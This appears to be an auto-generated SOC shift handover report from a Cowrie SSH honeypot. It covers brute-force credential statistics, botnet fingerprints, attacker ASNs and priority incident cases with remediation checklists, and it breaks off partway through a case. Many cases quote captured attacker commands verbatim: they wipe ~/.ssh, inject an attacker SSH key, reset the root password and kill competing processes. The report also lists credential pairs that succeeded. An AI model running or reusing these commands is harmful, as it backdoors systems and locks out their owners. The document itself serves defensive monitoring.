# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-03 |
| **Generated At** | 2026-06-03T11:07:29Z |
| **Shift Time** | 11:07 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **336** |
| Confirmed Threats | **282** |
| False Positives Filtered | **54** (16.1%) |
| Unique Attacker IPs | **54** |
| Countries of Origin | **16** |
| High Severity Cases | **80** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **256** |
| Malware Samples Analyzed | **0** HIGH · **19** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **232** |
| Unique Credential Pairs | **126** |
| Unique Usernames | **88** |
| Unique Passwords | **107** |
| Successful Auth Pairs | **49** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 81 |
| `345gs5662d34` | 38 |
| `ubuntu` | 5 |
| `admin` | 4 |
| `ftpuser` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 39 |
| `345gs5662d34` | 38 |
| `123456` | 18 |
| `` | 5 |
| `abc@123` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 39 |
| `345gs5662d34` | `345gs5662d34` | 38 |
| `user1` | `abc@123` | 2 |
| `citest` | `citest` | 2 |
| `station` | `station` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qwe123!` | `185.39.204.145` | 2026-06-03T04:33:36 |
| `root` | `3245gs5662d34` | `185.39.204.145` | 2026-06-03T04:33:40 |
| `root` | `123...com` | `185.39.204.145` | 2026-06-03T04:50:41 |
| `root` | `zxasqw12` | `103.166.10.244` | 2026-06-03T05:56:37 |
| `root` | `3245gs5662d34` | `103.166.10.244` | 2026-06-03T05:56:40 |
| `root` | `Qwer2026` | `187.0.238.206` | 2026-06-03T05:58:10 |
| `root` | `3245gs5662d34` | `187.0.238.206` | 2026-06-03T05:58:18 |
| `root` | `asterisk` | `187.0.238.206` | 2026-06-03T06:02:46 |
| `root` | `Sm@123456` | `103.166.10.244` | 2026-06-03T06:04:46 |
| `root` | `horror` | `103.166.10.244` | 2026-06-03T06:06:45 |
| `root` | `zxasqw12` | `187.0.238.206` | 2026-06-03T06:07:11 |
| `root` | `qwerqwer123` | `103.166.10.244` | 2026-06-03T06:08:44 |
| `root` | `q112233` | `187.0.238.206` | 2026-06-03T06:09:21 |
| `root` | `q112233` | `103.166.10.244` | 2026-06-03T06:12:47 |
| `root` | `Centos2025` | `187.0.238.206` | 2026-06-03T06:13:52 |
| `root` | `951753` | `187.0.238.206` | 2026-06-03T06:18:22 |
| `root` | `Qwer2026` | `103.166.10.244` | 2026-06-03T06:20:40 |
| `root` | `Root12345` | `103.166.10.244` | 2026-06-03T06:26:54 |
| `root` | `qwerqwer123` | `187.0.238.206` | 2026-06-03T06:27:17 |
| `root` | `Root12345` | `187.0.238.206` | 2026-06-03T06:29:30 |
| `root` | `horror` | `187.0.238.206` | 2026-06-03T06:31:45 |
| `root` | `Huawei@2024` | `103.166.10.244` | 2026-06-03T06:37:09 |
| `root` | `Sm@123456` | `187.0.238.206` | 2026-06-03T06:38:25 |
| `root` | `Centos2025` | `103.166.10.244` | 2026-06-03T06:45:18 |
| `root` | `Huawei@2024` | `187.0.238.206` | 2026-06-03T06:47:17 |
| `root` | `951753` | `103.166.10.244` | 2026-06-03T06:47:23 |
| `root` | `asterisk` | `103.166.10.244` | 2026-06-03T06:53:41 |
| `root` | `Sw12345678` | `103.188.177.46` | 2026-06-03T07:31:46 |
| `root` | `3245gs5662d34` | `103.188.177.46` | 2026-06-03T07:31:49 |
| `root` | `!@#123qweASD` | `103.188.177.46` | 2026-06-03T07:35:52 |
| `root` | `tt123456.` | `103.188.177.46` | 2026-06-03T07:49:32 |
| `root` | `Test123456789!` | `103.188.177.46` | 2026-06-03T07:51:25 |
| `root` | `1988` | `103.188.177.46` | 2026-06-03T07:53:25 |
| `root` | `Admin007` | `103.188.177.46` | 2026-06-03T07:55:26 |
| `root` | `sw` | `103.188.177.46` | 2026-06-03T07:57:23 |
| `root` | `lb@123456` | `103.188.177.46` | 2026-06-03T08:11:25 |
| `root` | `P@ss2024` | `157.66.80.97` | 2026-06-03T08:13:11 |
| `root` | `3245gs5662d34` | `157.66.80.97` | 2026-06-03T08:13:26 |
| `root` | `1994` | `103.188.177.46` | 2026-06-03T08:15:22 |
| `root` | `sTUw8BTN6L` | `60.205.248.70` | 2026-06-03T08:20:03 |
| `root` | `123456Cc` | `103.188.177.46` | 2026-06-03T08:21:16 |
| `root` | `root.2022` | `103.188.177.46` | 2026-06-03T08:23:08 |
| `root` | `zxcASD123` | `197.243.14.52` | 2026-06-03T09:01:32 |
| `root` | `3245gs5662d34` | `197.243.14.52` | 2026-06-03T09:01:37 |
| `root` | `Huawei@2026` | `112.6.227.209` | 2026-06-03T09:12:43 |
| `root` | `P@ssw0rd@2026` | `118.194.252.168` | 2026-06-03T09:35:53 |
| `root` | `3245gs5662d34` | `118.194.252.168` | 2026-06-03T09:35:57 |
| `root` | `regina1` | `213.230.127.104` | 2026-06-03T11:00:33 |
| `root` | `3245gs5662d34` | `213.230.127.104` | 2026-06-03T11:00:37 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **336** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 215 |
| OpenSSH | 6 |
| AsyncSSH (Python) | 5 |
| Perl Net::SSH | 2 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 192 | 15 |
| `a984ff804585...` | libssh-based | 6 | 1 |
| `03a80b21afa8...` | Modern SSH client | 5 | 2 |
| `fda360b1b4f4...` | Mirai/variant | 5 | 1 |
| `3c0eaacec19b...` | Mirai/variant | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 192 | 15 | Mirai/variant |
| `95420f9d932d...` | libssh | 18 | 6 | — |
| `a984ff804585...` | OpenSSH | 6 | 1 | libssh-based |
| `03a80b21afa8...` | libssh | 5 | 2 | Modern SSH client |
| `fda360b1b4f4...` | AsyncSSH (Python) | 5 | 1 | Mirai/variant |
| `3c0eaacec19b...` | Perl Net::SSH | 2 | 2 | Mirai/variant |
| `1b8acd46a07d...` | Unknown | 1 | 1 | Modern SSH client |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 39 | 8 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:qbVApW2pIbNk"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `112.6.227.209`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.166.10.244`, `213.230.127.104`, `118.194.252.168`, `103.188.177.46`, `185.39.204.145`, `187.0.238.206`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **54** |
| Unique ASNs | **37** |
| High-Risk ASNs | **32** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS213412` | ONYPHE SAS | 6 | HIGH |
| `AS16509` | Amazon.com, Inc. | 4 | LOW |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (80)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-05777278e93c

| Field | Detail |
|---|---|
| **Source IP** | `185.39.204[.]145` |
| **First Seen** | 2026-06-03 04:33 |
| **Last Seen** | 2026-06-03 04:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 04:33:35` | `cowrie.session.connect` |
| `2026-06-03 04:33:35` | `cowrie.client.version` |
| `2026-06-03 04:33:35` | `cowrie.client.kex` |
| `2026-06-03 04:33:36` | `cowrie.login.success` |
| `2026-06-03 04:33:36` | `cowrie.session.params` |
| `2026-06-03 04:33:36` | `cowrie.command.input` |
| `2026-06-03 04:33:36` | `cowrie.command.failed` |
| `2026-06-03 04:33:36` | `cowrie.log.closed` |
| `2026-06-03 04:33:36` | `cowrie.session.params` |
| `2026-06-03 04:33:36` | `cowrie.command.input` |
| `2026-06-03 04:33:37` | `cowrie.session.file_download` |
| `2026-06-03 04:33:37` | `cowrie.log.closed` |
| `2026-06-03 04:33:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.39.204[.]145` to AbuseIPDB if not already reported
- [ ] Block `185.39.204[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a970d14fdfc6

| Field | Detail |
|---|---|
| **Source IP** | `185.39.204[.]145` |
| **First Seen** | 2026-06-03 04:33 |
| **Last Seen** | 2026-06-03 04:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 04:33:39` | `cowrie.session.connect` |
| `2026-06-03 04:33:39` | `cowrie.client.version` |
| `2026-06-03 04:33:39` | `cowrie.client.kex` |
| `2026-06-03 04:33:40` | `cowrie.login.success` |
| `2026-06-03 04:33:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.39.204[.]145` to AbuseIPDB if not already reported
- [ ] Block `185.39.204[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f23faa34659

| Field | Detail |
|---|---|
| **Source IP** | `185.39.204[.]145` |
| **First Seen** | 2026-06-03 04:50 |
| **Last Seen** | 2026-06-03 04:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 04:50:40` | `cowrie.session.connect` |
| `2026-06-03 04:50:40` | `cowrie.client.version` |
| `2026-06-03 04:50:40` | `cowrie.client.kex` |
| `2026-06-03 04:50:41` | `cowrie.login.success` |
| `2026-06-03 04:50:41` | `cowrie.session.params` |
| `2026-06-03 04:50:41` | `cowrie.command.input` |
| `2026-06-03 04:50:41` | `cowrie.command.failed` |
| `2026-06-03 04:50:42` | `cowrie.log.closed` |
| `2026-06-03 04:50:42` | `cowrie.session.params` |
| `2026-06-03 04:50:42` | `cowrie.command.input` |
| `2026-06-03 04:50:42` | `cowrie.session.file_download` |
| `2026-06-03 04:50:42` | `cowrie.log.closed` |
| `2026-06-03 04:50:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.39.204[.]145` to AbuseIPDB if not already reported
- [ ] Block `185.39.204[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f839f2770cc

| Field | Detail |
|---|---|
| **Source IP** | `185.39.204[.]145` |
| **First Seen** | 2026-06-03 04:50 |
| **Last Seen** | 2026-06-03 04:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 04:50:49` | `cowrie.session.connect` |
| `2026-06-03 04:50:49` | `cowrie.client.version` |
| `2026-06-03 04:50:49` | `cowrie.client.kex` |
| `2026-06-03 04:50:50` | `cowrie.login.success` |
| `2026-06-03 04:50:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.39.204[.]145` to AbuseIPDB if not already reported
- [ ] Block `185.39.204[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3048328aba91

| Field | Detail |
|---|---|
| **Source IP** | `103.166.10[.]244` |
| **First Seen** | 2026-06-03 05:56 |
| **Last Seen** | 2026-06-03 05:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 05:56:36` | `cowrie.session.connect` |
| `2026-06-03 05:56:36` | `cowrie.client.version` |
| `2026-06-03 05:56:36` | `cowrie.client.kex` |
| `2026-06-03 05:56:37` | `cowrie.login.success` |
| `2026-06-03 05:56:37` | `cowrie.session.params` |
| `2026-06-03 05:56:37` | `cowrie.command.input` |
| `2026-06-03 05:56:37` | `cowrie.command.failed` |
| `2026-06-03 05:56:37` | `cowrie.log.closed` |
| `2026-06-03 05:56:37` | `cowrie.session.params` |
| `2026-06-03 05:56:37` | `cowrie.command.input` |
| `2026-06-03 05:56:37` | `cowrie.session.file_download` |
| `2026-06-03 05:56:37` | `cowrie.log.closed` |
| `2026-06-03 05:56:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.10[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.166.10[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34f3cf262d91

| Field | Detail |
|---|---|
| **Source IP** | `103.166.10[.]244` |
| **First Seen** | 2026-06-03 05:56 |
| **Last Seen** | 2026-06-03 05:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 05:56:39` | `cowrie.session.connect` |
| `2026-06-03 05:56:39` | `cowrie.client.version` |
| `2026-06-03 05:56:39` | `cowrie.client.kex` |
| `2026-06-03 05:56:40` | `cowrie.login.success` |
| `2026-06-03 05:56:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.10[.]244` to AbuseIPDB if not already reported
- [ ] Block `103.166.10[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db2065a1c8ff

| Field | Detail |
|---|---|
| **Source IP** | `187.0.238[.]206` |
| **First Seen** | 2026-06-03 05:58 |
| **Last Seen** | 2026-06-03 05:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 05:58:09` | `cowrie.session.connect` |
| `2026-06-03 05:58:09` | `cowrie.client.version` |
| `2026-06-03 05:58:09` | `cowrie.client.kex` |
| `2026-06-03 05:58:10` | `cowrie.login.success` |
| `2026-06-03 05:58:11` | `cowrie.session.params` |
| `2026-06-03 05:58:11` | `cowrie.command.input` |
| `2026-06-03 05:58:11` | `cowrie.command.failed` |
| `2026-06-03 05:58:12` | `cowrie.log.closed` |
| `2026-06-03 05:58:12` | `cowrie.session.params` |
| `2026-06-03 05:58:12` | `cowrie.command.input` |
| `2026-06-03 05:58:12` | `cowrie.session.file_download` |
| `2026-06-03 05:58:12` | `cowrie.log.closed` |
| `2026-06-03 05:58:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.0.238[.]206` to AbuseIPDB if not already reported
- [ ] Block `187.0.238[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17b04c8eeee0

| Field | Detail |
|---|---|
| **Source IP** | `187.0.238[.]206` |
| **First Seen** | 2026-06-03 05:58 |
| **Last Seen** | 2026-06-03 05:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 05:58:16` | `cowrie.session.connect` |
| `2026-06-03 05:58:16` | `cowrie.client.version` |
| `2026-06-03 05:58:16` | `cowrie.client.kex` |
| `2026-06-03 05:58:18` | `cowrie.login.success` |
| `2026-06-03 05:58:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.0.238[.]206` to AbuseIPDB if not already reported
- [ ] Block `187.0.238[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ef10ed67449

| Field | Detail |
|---|---|
| **Source IP** | `187.0.238[.]206` |
| **First Seen** | 2026-06-03 06:02 |
| **Last Seen** | 2026-06-03 06:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:02:44` | `cowrie.session.connect` |
| `2026-06-03 06:02:44` | `cowrie.client.version` |
| `2026-06-03 06:02:45` | `cowrie.client.kex` |
| `2026-06-03 06:02:46` | `cowrie.login.success` |
| `2026-06-03 06:02:47` | `cowrie.session.params` |
| `2026-06-03 06:02:47` | `cowrie.command.input` |
| `2026-06-03 06:02:47` | `cowrie.command.failed` |
| `2026-06-03 06:02:47` | `cowrie.log.closed` |
| `2026-06-03 06:02:48` | `cowrie.session.params` |
| `2026-06-03 06:02:48` | `cowrie.command.input` |
| `2026-06-03 06:02:48` | `cowrie.session.file_download` |
| `2026-06-03 06:02:48` | `cowrie.log.closed` |
| `2026-06-03 06:02:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.0.238[.]206` to AbuseIPDB if not already reported
- [ ] Block `187.0.238[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a8654dbb353

| Field | Detail |
|---|---|
| **Source IP** | `187.0.238[.]206` |
| **First Seen** | 2026-06-03 06:02 |
| **Last Seen** | 2026-06-03 06:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 06:02:52` | `cowrie.session.connect` |
| `2026-06-03 06:02:52` | `cowrie.client.version` |
| `2026-06-03 06:02:52` | `cowrie.client.kex` |
| `2026-06-03 06:02:53` | `cowrie.login.success` |
| `2026-06-03 06:02:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.0.238[.]206` to AbuseIPDB if not already reported
- [ ] Block `187.0.238[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b30ccc6ee312

| Field | Detail |
|---|---|
| **Source IP** | `103.166.10[.]244` |
| **First Seen** | 2026-06-03 06:04 |
| **Last Seen** | 2026-06-03 06:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
